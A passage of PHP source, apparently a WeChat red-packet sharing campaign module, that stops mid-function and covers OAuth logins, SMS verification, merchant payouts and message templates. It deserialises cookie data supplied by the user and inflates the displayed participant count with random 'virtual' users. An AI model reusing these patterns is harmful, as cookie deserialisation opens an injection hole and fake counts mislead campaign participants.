<?php
/**
 * 模块定义：规则内容
 *
 */
defined('IN_IA') or exit('Access Denied');
include 'template/api/class.juhe.recharge.php'; //引入聚合话费在线充值接口文件
class stonefish_redfunshareModuleSite extends WeModuleSite {	

	public function config($gourl,$goname){
		global $_W;	
		//查询是否填写系统参数
		$setting = $this->module['config'];
		if(empty($setting)){
			message('抱歉，系统参数没有填写，请先填写系统参数！', url('profile/module/setting',array('m' => 'stonefish_redfunshare','gourl'=>$gourl,'goname'=>$goname)), 'error');
		}
		//查询是否填写系统参数
		return $setting;
	}
	//是否安装模块
	public function modules_uniacid($modulesname) {
		global $_W;
		$modules = uni_modules($enabledOnly = true);
		$modules_arr = array();
		$modules_arr = array_reduce($modules, create_function('$v,$w', '$v[$w["mid"]]=$w["name"];return $v;'));
		if(in_array($modulesname,$modules_arr)){
		    return true;
		}else{
			return false;
		}
	}
	//是否安装模块
	//微信访问限制
	function Weixin(){
		global $_W;
		$setting = $this->module['config'];
		if($setting['stonefish_redfunshare_jssdk']==2 && !empty($setting['jssdk_appid']) && !empty($setting['jssdk_secret'])){
			$_W['account']['jssdkconfig'] = $this->getSignPackage($setting['jssdk_appid'],$setting['jssdk_secret']);
		}
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
		if(strpos($user_agent, 'MicroMessenger') === false){
			if($setting['weixinvisit']==1){
				include $this->template('remindnotweixin');
			    exit;
			}else{
				return true;
			}
		}else{
			return true;
		}
    }
	//微信访问限制
	//json返回参数
	public function Json_encode($_data) {
        die(json_encode($_data));
		exit;
    }
	//json返回参数
	/**
	* 发送客服消息
	* $access_token= account_weixin_token($_W['account']);
	* 当用户接到到一条模板消息，会给公共平台api发送一个xml文件【待处理】
	*/	
	public function sendtext($text,$openid=''){
		global $_W,$_GPC;
		if(empty($openid)){
		  $openid = $_W['fans']['from_user'];
		}
		load()->func('communication');
        load()->classs('weixin.account');
        $accObj= WeixinAccount::create($_W['account']['acid']);
        $access_token = $accObj->fetch_token();
		$data = array(
		    "touser"=>$openid,
		    "msgtype"=>"text",
		    "text"=>array("content"=>urlencode($text)));
		$url = "https://api.weixin.qq.com/cgi-bin/message/custom/send?access_token=".$access_token;
		$r=ihttp_post($url,urldecode(json_encode($data)));
		if($r['code']==200){
			return $r['content'];
		}else{
			return 'err';
		}
	}
	/**
	* 会员领取红包
	* @param str $_openid
	* 会员的$_openid
	* @return str
	* 1.备注【以下数据写死了】
	* 2.备注【发放金额】
 	*/	
	private function _sendpack($_openid,$fwid,$fee,$codesn,$_desc=''){
		load()->func('communication');
		global $_W;
		$redpack=pdo_fetch('select * from '.tablename('stonefish_redfunshare_redpack').' where uniacid=:uniacid',array(':uniacid'=>$_W['uniacid']));
		if(empty($_openid)){
			return false;
		}		
		if(empty($fwid)){
			return false;
		}
		if(empty($fee)){
			return false;
		}
		if($fee<1){
			return false;
		}
		$fee = $fee*100;
 		$url='https://api.mch.weixin.qq.com/mmpaymkttransfers/promotion/transfers';
        $pars = array();				
		$pars['mch_appid'] =$redpack['appid'];
		$pars['mchid']=$redpack['mchid'];		
		$pars['nonce_str'] =random(32);	
		$pars['partner_trade_no'] =$codesn;
		$pars['openid'] =$_openid;
		$pars['check_name'] ='NO_CHECK';
		$pars['amount'] =$fee;
		$pars['desc'] =(empty($_desc)?'没什么，就是想送你一个红包':$_desc);
		$pars['spbill_create_ip'] =$redpack['ip'];
        ksort($pars, SORT_STRING);
        $string1 = '';
        foreach ($pars as $k => $v) {
            $string1 .= "{$k}={$v}&";
        }
        $string1 .= "key=".$redpack['signkey'];
        $pars['sign'] = strtoupper(md5($string1));
        $xml = array2xml($pars);
        $extras = array();
		$extras['CURLOPT_CAINFO'] =  ATTACHMENT_ROOT ."/images/cert/".$_W['uniacid']."/rootca.pem";
        $extras['CURLOPT_SSLCERT'] =ATTACHMENT_ROOT . "/images/cert/".$_W['uniacid']."/apiclient_cert.pem";
        $extras['CURLOPT_SSLKEY'] =ATTACHMENT_ROOT . "/images/cert/".$_W['uniacid']."/apiclient_key.pem";
		$procResult = null;
        $resp = ihttp_request($url, $xml, $extras);
        if (is_error($resp)) {
            $procResult = $resp;
        } else {
			$arr=json_decode(json_encode((array) simplexml_load_string($resp['content'])), true);
            $xml = '<?xml version="1.0" encoding="utf-8"?>' . $resp['content'];
            $dom = new \DOMDocument();
            if ($dom->loadXML($xml)) {
                $xpath = new \DOMXPath($dom);
                $code = $xpath->evaluate('string(//xml/return_code)');
                $ret = $xpath->evaluate('string(//xml/result_code)');
                if (strtolower($code) == 'success' && strtolower($ret) == 'success') {
                    $procResult =  array('errno'=>0,'error'=>'success');;
                } else {
                    $error = $xpath->evaluate('string(//xml/err_code_des)');
                    $procResult = array('errno'=>-2,'error'=>$error);
                }
            } else {
				$procResult = array('errno'=>-1,'error'=>'未知错误');				
            }
        }
		//以上为支付部分，以下为记录日志
		$rec = array();
		$rec['log'] = $error;
		$rec['zhongjiang']=2;
        if ($procResult['errno']!=0) {
			$rec['completed']=$procResult['errno'];				
			pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$fwid));
        } else {
			$rec['createtime']=time();
		    $rec['consumetime']=time();
			$rec['completed']=1;
			$rec['ticketname']='系统';
			pdo_update('stonefish_redfunshare_fansaward',$rec,array('id'=>$fwid));
        }
		return $procResult;
	}
	//发送消息模板
	public function Seed_tmplmsg($openid,$tmplmsgid,$rid,$params) {
        global $_W;
		$reply = pdo_fetch("select title,starttime,endtime,danwei,redpack FROM ".tablename("stonefish_redfunshare_reply")." where rid = :rid", array(':rid' => $rid));
		$exchange = pdo_fetch("select awardingstarttime,awardingendtime FROM ".tablename("stonefish_redfunshare_exchange")." where rid = :rid", array(':rid' => $rid));
		$listtotal = pdo_fetchcolumn("select xuninum+fansnum as total from ".tablename("stonefish_redfunshare_reply")." where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$tmplmsg = pdo_fetch("select * FROM ".tablename("stonefish_redfunshare_tmplmsg")." where id = :id", array(':id' => $tmplmsgid));
		$fans = pdo_fetch("select mobile,realname,nickname FROM ".tablename("stonefish_redfunshare_fans")." where rid = :rid and from_user = :from_user", array(':rid' => $rid, ':from_user' => $openid));
		$fans['realname'] = empty($fans['realname']) ? stripcslashes($fans['nickname']) : $fans['realname'];
		if(!empty($tmplmsg)){
			$appUrl= $this->createMobileUrl($params['do'], array('rid' => $rid,'id' => $params['iid']),true);
		    $appUrl=$_W['siteroot'].'app/'.substr($appUrl,2);
			$str = array(
			    '#活动名称#'=>$reply['title'],
				'#参与人数#'=>$listtotal,
				'#活动时间#'=>date('Y-m-d H:i', $reply['starttime']).'至'.date('Y-m-d H:i', $reply['endtime']),
				'#兑奖时间#'=>date('Y-m-d H:i', $exchange['awardingstarttime']).'至'.date('Y-m-d H:i', $exchange['awardingendtime']),
				'#兑换数量#'=>$params['duihuanshu'].$reply['danwei'].$reply['redpack'],
				'#粉丝昵称#'=>stripcslashes($fans['nickname']),
				'#真实姓名#'=>$fans['realname'],
				'#手机号码#'=>$fans['mobile'],
				'#现在时间#'=>date('Y-m-d H:i', time()),
				'#奖品数量#'=>$params['prizenum'],
				'#中奖时间#'=>date('Y-m-d H:i', $params['prizetime']),
				'#助力昵称#'=>stripcslashes($params['nickname'])
			);
			$datas['first'] = array('value'=>strtr($tmplmsg['first'],$str),'color'=>$tmplmsg['firstcolor']);
			for($i = 1; $i <= 10; $i++) {
				if(!empty($tmplmsg['keyword'.$i]) && !empty($tmplmsg['keyword'.$i.'code'])){
					$datas[$tmplmsg['keyword'.$i.'code']] = array('value'=>strtr($tmplmsg['keyword'.$i],$str),'color'=>$tmplmsg['keyword'.$i.'color']);
				}
			}
			$datas['remark'] = array('value'=>strtr($tmplmsg['remark'],$str),'color'=>$tmplmsg['remarkcolor']);
	        $data=json_encode($datas);
			
			load()->func('communication');
            load()->classs('weixin.account');
            $accObj = WeixinAccount::create($_W['acid']);
            $access_token = $accObj->fetch_token();
			if (empty($access_token)) {
                return;
            }
			$postarr = '{"touser":"'.$openid.'","template_id":"'.$tmplmsg['template_id'].'","url":"'.$appUrl.'","topcolor":"'.$tmplmsg['topcolor'].'","data":'.$data.'}';
            $res = ihttp_post('https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=' . $access_token, $postarr);
			//添加消息发送记录
			$tmplmsgdata = array(
				'rid' => $rid,
				'uniacid' => $_W['uniacid'],
				'from_user' => $openid,
				'tmplmsgid' => $tmplmsgid,
				'tmplmsg' => $postarr,
				'seednum' => 1,
				'createtime' => TIMESTAMP,
			);
			pdo_insert('stonefish_redfunshare_fanstmplmsg', $tmplmsgdata);
			//添加消息发送记录
			return true;
		}
		return;
    }
	//发送消息模板
	//虚拟人数据配置
	function Xuni_time($reply){
	    $now = time();
		if($now-$reply['xuninum_time']>$reply['xuninumtime']){
		    pdo_update('stonefish_redfunshare_reply', array('xuninum_time' => $now,'xuninum' => $reply['xuninum']+mt_rand($reply['xuninuminitial'],$reply['xuninumending'])), array('id' => $reply['id']));
		}
	}
	//虚拟人数据配置
	//分享设置
	function Get_share($rid,$from_user,$title) {
		global $_W;
		$uniacid = $_W['uniacid'];
		if (!empty($rid)) {
			$listtotal = pdo_fetchcolumn("select xuninum+fansnum as total from ".tablename("stonefish_redfunshare_reply")." where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
        }
		if (!empty($from_user)) {
		    $fans = pdo_fetch("select realname,nickname FROM ".tablename("stonefish_redfunshare_fans")." where uniacid= :uniacid AND rid= :rid AND from_user= :from_user", array(':uniacid' => $uniacid,':rid' => $rid,':from_user' => $from_user));
		}
		$str = array('#参与人数#'=>$listtotal,'#粉丝昵称#'=>stripcslashes($fans['nickname']),'#真实姓名#'=>$fans['realname']);
		$result = strtr($title,$str);
        return $result;
    }
	//分享设置	
	//随机抽奖ID
	function Get_rand($proArr) {   
        $result = '';    
        //概率数组的总概率精度   
        $proSum = array_sum($proArr);    
        //概率数组循环   
        foreach ($proArr as $key => $proCur) {   
            $randNum = mt_rand(1, $proSum);   
            if ($randNum <= $proCur) {   
                $result = $key;   
                break;   
            } else {
                $proSum -= $proCur;   
            }         
        }   
        unset ($proArr);    
        return $result;
    }
	//随机抽奖ID
	//提示出错页
	function Message_tips($rid = 0,$msg,$url = ''){
        global $_W;
		$reply = pdo_fetch("select msgadpictime,msgadpic from ".tablename("stonefish_redfunshare_reply")." where rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		$time = $reply['msgadpictime'];
		if(empty($time))$time=5;
		if($reply['msgadpic']!='N;' && !empty($reply)){
			$msgadpic = iunserializer($reply['msgadpic']);
		    $msgadpicid = array_rand($msgadpic);
		    $msgadpic =$msgadpic[$msgadpicid];
		}
		if(empty($msg)){
			$msg = '未知错误！';
		}
		include $this->template('message');
		exit;
    }
	//提示出错页
	//获取openid
	function Get_openid($rid) {
        global $_W;
		$from_user = array();
		$from_user['openidtrue'] = $_SESSION['openid'];
		$from_user['openid'] = $_W['openid'];
		$setting = $this->module['config'];
		if($_W['account']['level']<4 && $setting['stonefish_redfunshare_oauth']==1){
			$from_user['openid'] = $_SESSION['oauth_openid'];
			if(empty($from_user['openid'])){
				$this->message_tips($rid,'系统借用公众平台oAuth没有设置，请联系管理员设置！');
			}
		}
		if($_W['account']['level']<4 && $setting['stonefish_redfunshare_oauth']==2){
			$from_user['openid'] = $_COOKIE["stonefish_oauth_from_user"];
			if(empty($from_user['openid'])){
				$this->message_tips($rid,'系统模块借用公众平台oAuth没有设置，请联系管理员设置！');
			}
		}
		if(empty($from_user['openid'])){
			if (isset($_COOKIE["user_oauth2_wuopenid"])){
				$from_user['openid'] = $_COOKIE["user_oauth2_wuopenid"];
			}
		}
		if(empty($from_user['openid'])){
			$from_user['openid'] = time().mt_rand(1000,9999);
		}
		return $from_user;
    }
	//获取openid
	//获取粉丝数据
	function Get_UserInfo($power,$rid,$iid = 0,$page_fromuser = '',$entrytype) {   
        global $_W;
		$setting = $this->module['config'];
		if(!empty($_COOKIE['stonefish_userinfo'])){
			$userinfo = iunserializer($_COOKIE["stonefish_userinfo"]);
			if($_COOKIE["stonefish_userinfo_power"]!=$power || empty($userinfo['openid'])){
				setcookie("stonefish_userinfo", '', time()-7200);
				setcookie("stonefish_userinfo_power", '', time()-7200);
				$appUrl=$this->createMobileUrl('entry', array('rid' => $rid,'iid' => $iid,'from_user' => $page_fromuser,'entrytype' => $entrytype),true);
				$appUrl=substr($appUrl,2);
				$url = $_W['siteroot'] ."app/".$appUrl;
				header("location: $url");
				exit;
			}
			if(empty($userinfo['nickname']) && $power==2){
				setcookie("stonefish_userinfo", '', time()-7200);
				setcookie("stonefish_userinfo_power", '', time()-7200);
				$appUrl=$this->createMobileUrl('entry', array('rid' => $rid,'iid' => $iid,'from_user' => $page_fromuser,'entrytype' => $entrytype),true);
				$appUrl=substr($appUrl,2);
				$url = $_W['siteroot'] ."app/".$appUrl;
				header("location: $url");
				exit;
			}
			if(empty($userinfo['headimgurl']) && $power==2){
				$userinfo['headimgurl'] = MODULE_URL.'template/images/avatar.jpg';
			}
		}elseif($setting['stonefish_redfunshare_oauth']>=1 || $_W['account']['level']==4){
			$appUrl=$this->createMobileUrl('entry', array('rid' => $rid,'iid' => $iid,'from_user' => $page_fromuser,'entrytype' => $entrytype),true);
			$appUrl=substr($appUrl,2);
			$url = $_W['siteroot'] ."app/".$appUrl;
			header("location: $url");
			exit;
		}else{
			$userinfo = array('headimgurl' => MODULE_URL.'template/images/avatar.jpg','nickname' => '匿名');
		}
		return $userinfo;
	}
	//获取粉丝数据
	//验证短信码
	function code_verify($receiver, $code) {
		global $_W;
	    $smsconfig = pdo_fetch("SELECT aging,agingrepeat FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofsms'");
	    if(!empty($smsconfig)) {
	        $data = pdo_fetch('SELECT id FROM ' . tablename('uni_verifycode') . ' WHERE uniacid = :uniacid AND receiver = :receiver AND verifycode = :verifycode AND createtime > :createtime', array(':uniacid' => $_W['uniacid'], ':receiver' => $receiver, ':verifycode' => $code, ':createtime' => time() - $smsconfig['aging']));
	        if(empty($data)) {
		        return false;
	        }else{
	            if($smsconfig['agingrepeat']){
		            pdo_delete('uni_verifycode', array('id' => $data['id']));
		        }
	        }
	        return true;
	    }else{
	        return false;
	    }
    }
	//验证短信码
	//查询手机号归属
	function mobile_verify($mobile,$resultv = '') {
		global $_W, $_GPC;
		$setting = $this->module['config'];
		$apiurl = 'http://apis.juhe.cn/mobile/get';
		$params = array(
		    'key' => $setting['mobile_get_key'],
  		    'phone' => $mobile
		);
		$paramsString = http_build_query($params);
		$content = @file_get_contents($apiurl.'?'.$paramsString);
		$result = json_decode($content,true);
		if($result['error_code'] == '0'){
    		/*
    		"province":"浙江",
    		"city":"杭州",
    		"areacode":"0571",
    		"zip":"310000",
    		"company":"中国移动",
    		"card":"移动动感地带卡"
    		*/
			if(empty($resultv)){
				$mobile_v = $result['result']['company'];
				$mobile_v .= '|'.$result['result']['province'];
				$mobile_v .= '|'.$result['result']['city'];
			}else{
				$mobile_v = $result['result'][$resultv];
			}
    	}
		return $mobile_v;
    }
	//查询手机号归属
	//查询手机号归属
	function doMobileMverify() {
		global $_W, $_GPC;
		$setting = $this->module['config'];
		$apiurl = 'http://apis.juhe.cn/mobile/get';
		$params = array(
		    'key' => $setting['mobile_get_key'],
  		    'phone' => $_GPC['mobile']
		);
		$paramsString = http_build_query($params);
		$content = @file_get_contents($apiurl.'?'.$paramsString);
		$result = json_decode($content,true);
		if($result['error_code'] == '0'){
    		/*
    		"province":"浙江",
    		"city":"杭州",
    		"areacode":"0571",
    		"zip":"310000",
    		"company":"中国移动",
    		"card":"移动动感地带卡"
    		*/
    		$mobile_company = $result['result']['company'];
			$data = array(
			    'success' => 1,
			    'msg' => $mobile_company,
		    );
    	}else{
			$data = array(
			    'success' => 0,
			    'msg' => '无法查询，请自己选择运营商',
		    );
		}
		$this->json_encode($data);
    }
	//查询手机号归属
	//跳转
	public function Appurlheader($entrytype, $rid, $iid = 0, $from_user) {
		global $_W;
		$appUrl=$this->createMobileUrl($entrytype, array('rid' => $rid, 'fromuser' => $from_user, 'iid' => $iid),true);
		$appUrl=substr($appUrl,2);
		$url = $_W['siteroot'] ."app/".$appUrl;
		header("location: $url");
		exit;
	}
	//跳转
	//活动状态
	function Check_reply($reply) {   
		if ($reply == false) {
            $this->message_tips($reply['rid'],'抱歉，活动不存在，您穿越了！');
        }else{
			if ($reply['isshow'] == 0) {
				$this->message_tips($reply['rid'],'抱歉，活动暂停，请稍后...');
			}
			if ($reply['starttime'] > time()) {
				$this->message_tips($reply['rid'],'抱歉，活动未开始，请于'.date("Y-m-d H:i:s", $reply['starttime']) .'参加活动!');
			}
		}
		return true;
    }
	//活动状态
	//获取关健词
	function Rule_keyword($rid) {   
		$keyword = pdo_fetchall("select content from ".tablename('rule_keyword')." where rid=:rid and type=1",array(":rid"=>$rid));
        foreach ($keyword as $keywords){
			$rule_keyword .= $keywords['content'].',';
		}
		$rule_keyword = substr($rule_keyword,0,strlen($rule_keyword)-1);
		return $rule_keyword;
    }
	//获取关健词
	//认证第二部获取 openid和accessToken
    public function doMobileauth2(){
        global $_W, $_GPC;
		$setting = $this->module['config'];
        $entrytype = $_GPC['entrytype'];
        $code = $_GPC['code'];                
        $rid = intval($_GPC['rid']);
		$iid = intval($_GPC['iid']);
		$tokenInfo = $this->getAuthTokenInfo($code,$_GPC['power']);
        $from_user = $tokenInfo['openid'];
		setcookie("stonefish_userinfo", iserializer($tokenInfo), time()+3600*24*$setting['stonefish_oauth_time']);
		setcookie("stonefish_userinfo_power", $_GPC['power'], time()+3600*24*$setting['stonefish_oauth_time']);
		setcookie("stonefish_oauth_from_user", $from_user, time()+3600*24*$setting['stonefish_oauth_time']);
        if ($entrytype == "index") { // 粉丝参与活动
		    $appUrl= $this->createMobileUrl('index', array('rid' => $rid),true);
		    $appUrl=substr($appUrl,2);
            $url = $_W['siteroot'] . "app/".$appUrl;
        } elseif ($entrytype == "shareview") { // 好友进入认证
            $appUrl=$this->createMobileUrl('shareview', array('rid' => $rid,'iid' => $iid,"fromuser" => $_GPC['from_user']),true);
			$appUrl=substr($appUrl,2);
			$url = $_W['siteroot'] ."app/".$appUrl;
        }
        header("location: $url");
		exit;
    }
	//认证第二部获取 openid和accessToken
    //获取token信息
    public function getAuthTokenInfo($code,$power){
        global $_GPC, $_W;
		if ($_W['account']['level']==4){
			$appid = $_W['account']['key'];
            $secret = $_W['account']['secret'];
		}else{
			$setting = $this->module['config'];
			if($setting['stonefish_redfunshare_oauth']==1 && !empty($_W['oauth_account']['key']) && !empty($_W['oauth_account']['secret'])){
				$appid = $_W['oauth_account']['key'];
                $secret = $_W['oauth_account']['secret'];
			}
			if($setting['stonefish_redfunshare_oauth']==2 && !empty($setting['appid']) && !empty($setting['secret'])){
				$appid = $setting['appid'];
                $secret = $setting['secret'];
			}
		}
        load()->func('communication');
        $oauth2_code = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=" . $appid . "&secret=" . $secret . "&code=" . $code . "&grant_type=authorization_code";
        $content = ihttp_get($oauth2_code);
        $token = @json_decode($content['content'], true);
        if (empty($token) || ! is_array($token) || empty($token['access_token']) || empty($token['openid'])) {
            echo '<h1>获取微信公众号授权' . $code . '失败[无法取得token以及openid], 请稍后重试！ 公众平台返回原始数据为: <br />' . $content['meta'] . '<h1>';
            exit();
        }else{
			if($power==1){
				$token = array('openid'=>$token['openid'],'headimgurl' => MODULE_URL.'template/images/avatar.jpg','nickname' => '匿名');
			}else{
				$token = $this->getUserInfo($token['openid'], $token['access_token']);
			}
		}
        return $token;
    }
	//获取token信息
    //获取用户信息
    public function getUserInfo($openid, $access_token)    {
		load()->func('communication');
        $tokenUrl = "https://api.weixin.qq.com/sns/userinfo?access_token=" . $access_token . "&openid=" . $openid . "&lang=zh_CN";
        $content = ihttp_get($tokenUrl);
        $userInfo = @json_decode($content['content'], true);
        return $userInfo;
    }
	//获取用户信息
	//微站导航
	public function Gethomeurl(){
		global $_GPC,$_W;
		$uniacid = $_W['uniacid'];
		$time = time();
		$urls = array();
		$list = pdo_fetchall("select rid, title FROM ".tablename('stonefish_redfunshare_reply')." where uniacid = :uniacid and starttime <= :time and endtime >= :time and isshow=1", array('uniacid' => $uniacid,'time' => $time));
		if(!empty($list)){
			foreach($list as $row){
				$urls[] = array('title'=>$row['title'], 'url'=> $_W['siteroot']."app".substr($this->createMobileUrl('entry', array('rid' => $row['rid'],'entrytype' => 'index')),true),2);
			}
		}
		return $urls;
	}
	//微站导航
	//发送手机验证码
	function sms_send($mobile, $code, $rid = 0) {
	    global $_W;
	    load()->func('communication');
	    //读取短信配置
	    $config = pdo_fetch("SELECT * FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofsms' order by id desc");
		//查询短信配额数量
		$total = pdo_fetchcolumn("SELECT sum(total) FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and apitype='mobileofsms'");
		$draw = pdo_fetchcolumn("SELECT sum(draw) FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and apitype='mobileofsms'");
		//查询短信配额数量
	    if(!empty($config)) {
			if($total-$draw>=1){
				$tpl_value = urlencode("#code#=".$code."&#app#=".$config['sign']."");
				//读取短信接口配置
			    $appkey = $config['key']; 
			    $openid = $config['sign'];
			    $recharge = new recharge($appkey,$openid);
			    //读取短信接口配置
				$sendStatusRes = $recharge->send($mobile,$config['tpl_id'],$tpl_value);
				if($sendStatusRes){
				    if($sendStatusRes['error_code']=='0'){
					    //添加短信记录
					    $insertsms = array();
					    $insertsms['uniacid'] = $_W['uniacid'];
					    $insertsms['apitype'] = 'mobileofsms';
					    $insertsms['uid'] = $_W['member']['uid'];
					    $insertsms['from_user'] = $_W['openid'];
					    $insertsms['code'] = $code;
					    $insertsms['rid'] = $rid;
					    $insertsms['module'] = 'stonefish_redfunshare';
					    $insertsms['modulename'] = '红包乐分享';
					    $insertsms['mobile'] = $mobile;
					    $insertsms['createtime'] = TIMESTAMP;
					    pdo_insert('stonefish_mcenter_juheapirecord', $insertsms);
					    //添加短信记录
					    //添加使用次数
					    $smsconfig = pdo_fetch("SELECT * FROM ".tablename('stonefish_mcenter_juheapi')." WHERE uniacid = '".$_W['uniacid']."' and total>draw and apitype='mobileofsms' order by id asc");
					    pdo_update('stonefish_mcenter_juheapi', array('draw' => $smsconfig['draw']+1), array('id' => $smsconfig['id']));
					    //添加使用次数
					    return true;
				    }else{
					    return error(-1, $result['reason']);
				    }
				}else{
					return error(-1, '发送短信失败, 请联系系统管理人员. 错误详情: 不能链接短信服务网关');
				}
			}else{
				return error(-1, '发送短信失败, 短信配额已使用完');
			}
	    }
	    return error(-1, '发送短信失败, 请联系系统管理人员. 错误详情: 没有设置短信参数');
		return true;
    }
	//发送手机验证码
	//获取手机验证码
	public function doMobileVerifycode() {
		global $_GPC, $_W;
		$mobile = trim($_GPC['mobile']);
		$rid = intval($_GPC['rid']);
		if($mobile == ''){
			exit('请输入手机号');
		}elseif(preg_match("/^13[0-9]{1}[0-9]{8}$|15[0-9]{1}[0-9]{8}$|18[0-9]{1}[0-9]{8}$|17[0-9]{1}[0-9]{8}$/", $mobile)){
			//验证成功
		}else{
			exit('您输入的手机号格式错误');
		}
		$smsconfig = pdo_fetch("SELECT `aging` FROM ".tablename('stonefish_redfunshare_apiconfig')." WHERE uniacid = '{$_W['uniacid']}' and apitype='mobileofsms'");
		$sql = 'DELETE FROM ' . tablename('uni_verifycode') . ' WHERE `createtime`<' . (TIMESTAMP - $smsconfig['aging']);
		pdo_query($sql);
		$sql = 'SELECT * FROM ' . tablename('uni_verifycode') . ' WHERE `receiver`=:mobile AND `uniacid`=:uniacid';
		$pars = array();
		$pars[':mobile'] = $mobile;
		$pars[':uniacid'] = $_W['uniacid'];
		$row = pdo_fetch($sql, $pars);
		$record = array();
		if(!empty($row)) {
			if($row['total'] >= 5) {
				exit('您的操作过于频繁,请稍后再试');
			}
			$code = random(6, true);
			$record['total'] = $row['total'] + 1;
			$record['verifycode'] = $code;
			$record['createtime'] = TIMESTAMP;
		} else {
			$code = random(6, true);
			$record['uniacid'] = $_W['uniacid'];
			$record['receiver'] = $mobile;
			$record['verifycode'] = $code;
			$record['total'] = 1;
			$record['createtime'] = TIMESTAMP;
		}
		$result = $this->sms_send($mobile, $code, $rid);
		if(is_error($result)) {
			exit($result['message']);
		} else {
			if(!empty($row)) {
				pdo_update('uni_verifycode', $record, array('id' => $row['id']));
			} else {
				pdo_insert('uni_verifycode', $record);
			}
			exit('success');
		}		
	}
	//获取手机验证码
	//会员中心
	public function doMobileMyprofile() {
		global $_GPC,$_W;
		$uniacid = $_W['uniacid'];
		$time = time();
		$from_user = $_W['openid'];
		$page_from_user = base64_encode(authcode($from_user, 'ENCODE'));

		echo "会员中心显示内容";
		exit;

		if($this->Weixin()){
			include $this->template('myprofile');
		}else{
			$this->Weixin();
		}		
	}
	//会员中心
	//进入页
	public function doMobileEntry() {
		global $_GPC, $_W;
		$this->Weixin();
		$rid = intval($_GPC['rid']);
		if(empty($rid))$this->message_tips($rid,'抱歉，参数错误！');
		$iid = intval($_GPC['iid']);
		$entrytype = $_GPC['entrytype'];
		$uniacid = $_W['uniacid'];       
		$acid = $_W['acid'];
		$reply = pdo_fetch("select * from " . tablename('stonefish_redfunshare_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
        //活动状态
		$this->check_reply($reply);		
		//活动状态		
		//虚拟人数
		$this->xuni_time($reply);
		//虚拟人数
		//获取openid
		$from_user = $_SESSION['openid'];
		//获取openid
		//广告显示控制
		if($reply['homepictime']>0){
			if($reply['homepictype']==1 && $_GPC['homepic']!="yes"){
				include $this->template('homepictime');
				exit;
			}
			if((empty($_COOKIE['stonefish_redfunshare_hometime'.$rid]) || $_COOKIE["stonefish_redfunshare_hometime".$rid]<=time()) && $_GPC['homepic']!="yes"){
				switch ($reply['homepictype']){
				    case 2:
				        setcookie("stonefish_redfunshare_hometime".$rid, strtotime(date("Y-m-d",strtotime("+1 day"))), strtotime(date("Y-m-d",strtotime("+1 day"))));
				        break;
					case 3:
				        setcookie("stonefish_redfunshare_hometime".$rid, strtotime(date("Y-m-d",strtotime("+1 week"))), strtotime(date("Y-m-d",strtotime("+7 week"))));
				        break;
					case 4:
				        setcookie("stonefish_redfunshare_hometime".$rid, strtotime(date("Y-m-d",strtotime("+1 year"))), strtotime(date("Y-m-d",strtotime("+1 year"))));
				        break;
				}
				include $this->template('homepictime');
				exit;
			}			
		}		
        //广告显示控制
		//获取openid以及头像昵称
		$setting = $this->module['config'];
		if($_W['account']['level']==4){
			load()->classs('weixin.account');
		    $accObj= WeixinAccount::create($acid);
		    $access_token = $accObj->fetch_token();
			load()->func('communication');
			$oauth2_code = "https://api.weixin.qq.com/cgi-bin/user/info?access_token=".$access_token."&openid=".$from_user."&lang=zh_CN";
			$content = ihttp_get($oauth2_code);
			$token = @json_decode($content['content'], true);
			if($token['subscribe']){
				setcookie("stonefish_userinfo", iserializer($token), time()+3600*24*$setting['stonefish_oauth_time']);
				setcookie("stonefish_userinfo_power", $reply['power'], time()+3600*24*$setting['stonefish_oauth_time']);
				$this->appurlheader($entrytype, $rid, $iid, $_GPC['from_user']);
			}else{
				if(!empty($_COOKIE['stonefish_userinfo'])){
			        $this->appurlheader($entrytype, $rid, $iid, $_GPC['from_user']);
				}else{
					//snsapi_base为只获取OPENID,snsapi_userinfo为获取头像和昵称
			        $scope = $reply['power']==1 ? 'snsapi_base' : 'snsapi_userinfo';
					if($scope==1){
						$this->appurlheader($entrytype, $rid, $iid, $_GPC['from_user']);
					}else{
						$appid = $_W['account']['key'];
				        $appUrl= $this->createMobileUrl('auth2', array('entrytype' => $entrytype,'rid' => $rid,'from_user' => $_GPC['from_user'],'power' => $reply['power']),true);
		                $appUrl = substr($appUrl,2);
                        $redirect_uri = $_W['siteroot'] ."app/".$appUrl ;
                        $oauth2_code = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=".$appid."&redirect_uri=".urlencode($redirect_uri)."&response_type=code&scope=".$scope."&state=1#wechat_redirect";
                        header("location: $oauth2_code");
		                exit;	
					}
				}
			}
		}else{
			if(!empty($_COOKIE['stonefish_userinfo'])){
			    $this->appurlheader($entrytype, $rid, $iid, $_GPC['from_user']);
		    }else{
				if($setting['stonefish_redfunshare_oauth']==0){
				    if(!isset($_COOKIE["user_oauth2_wuopenid"]) || empty($_COOKIE['user_oauth2_wuopenid'])){
				   	    //设置cookie信息
					    $token = array('openid' => time().mt_rand(1000,9999),'headimgurl' => MODULE_URL.'template/images/avatar.jpg','nickname' => '匿名'.time().mt_rand(1000,9999));
			    	    setcookie("user_oauth2_wuopenid", time(), time()+3600*24*$setting['stonefish_oauth_time']);
					    setcookie("stonefish_userinfo", iserializer($token), time()+3600*24*$setting['stonefish_oauth_time']);
				        setcookie("stonefish_userinfo_power", $reply['power'], time()+3600*24*$setting['stonefish_oauth_time']);
			   	    }
			        $this->appurlheader($entrytype, $rid, $iid, $_GPC['from_user']);
			    }
				if ($setting['stonefish_redfunshare_oauth']==1 && !empty($_W['oauth_account']['key']) && !empty($_W['oauth_account']['secret']))$appid = $_W['oauth_account']['key'];
			    if ($setting['stonefish_redfunshare_oauth']==2 && !empty($setting['appid']) && ! empty($setting['secret']))$appid = $setting['appid'];
		        //snsapi_base为只获取OPENID,snsapi_userinfo为获取头像和昵称
			    $scope = $reply['power']==1 ? 'snsapi_base' : 'snsapi_userinfo';
